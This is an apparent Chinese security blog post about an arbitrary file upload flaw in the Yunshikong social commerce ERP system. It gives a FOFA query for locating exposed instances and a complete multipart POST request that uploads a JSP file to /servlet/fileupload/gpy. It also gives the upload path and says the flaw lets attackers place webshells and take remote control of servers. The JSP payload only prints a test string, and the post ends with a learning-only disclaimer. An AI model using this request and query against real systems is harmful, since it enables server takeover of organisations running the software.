#  云时空社会化商业ERP系统任意文件上传漏洞   
原创 安全透视镜  网络安全透视镜   2023-12-19 19:56  
  
# 一、漏洞描述  
  
****  
云时空商业ERP以大型集团供应链系统为支撑，是基于互联网技术的多渠道模式营销服务管理体系，可以整合线上和线下交易模式，覆盖企业经营管理应用各个方面。有效掌控全流程情况，敏捷捕捉消费者需求，快速响应市场变化，规避经营风险，以市场为导向，优化部署营销资源，协同产销、供应与服务，帮助您的企业构建敏捷的经营管理平台，还能通过互联网、人工智能等创新模式，整合流通企业上下游产业链资源，协助您共享数字服务，提升企业数字化管控效率。  
  
该系统存在任意文件上传漏洞，通过此漏洞，攻击者可上传webshell木马，远程控制服务器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBnebV4T43AmCxXnLMttuTR57VMYkicibNvJKIkJgicFvsuibhJmjpBaBicTg/640?wx_fmt=png&from=appmsg "")  
  
# 二、网络空间搜索引擎搜索  
  
  
fofa查询  
```
app="云时空社会化商业ERP系统"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBmKrcicfiazcfrtHv0aATgvJ1OwQXXzuUeGq29yUibiceXGZJsE6Y3NnT2A/640?wx_fmt=png&from=appmsg "")  
  
# 三、漏洞复现  
  
  
POC  
```
POST /servlet/fileupload/gpy HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 238

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="check.jsp"
Content-Type: application/octet-stream

<% out.println("This website has a vulnerability"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBDnAzFD4CqGZTjl38HgvXvctlRpHTwX9E9p7rqTy37KQP9b3gDA18RA/640?wx_fmt=png&from=appmsg "")  
  
  
文件上传成功后路径为：/uploads/pics/上传日期/check.jsp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBOiciaESDaMFR4QQbribcaic7bpM9MicjdkvP4xcIKLicrYw7ebB8c0C99epg/640?wx_fmt=png&from=appmsg "")  
  
  
**四、漏洞检测**  
  
=  
  
pocsuite3漏洞检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBufZToKYNPccRBibiaksOibmicnaVZROUAbNI1ibSkYXhuugQgNkMwWmuadQ/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞检测脚本已上传免费漏洞库  
  
地址：  
  
https://github.com/Vme18000yuan/FreePOC  
  
# 免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54mVicYJkaOO1JQicEDBGCBM1P7IiaiablZ9tEUrP27FyvB9CZWl5SiaqhicDw/640?wx_fmt=png "")  
  
****  
****  
  
  
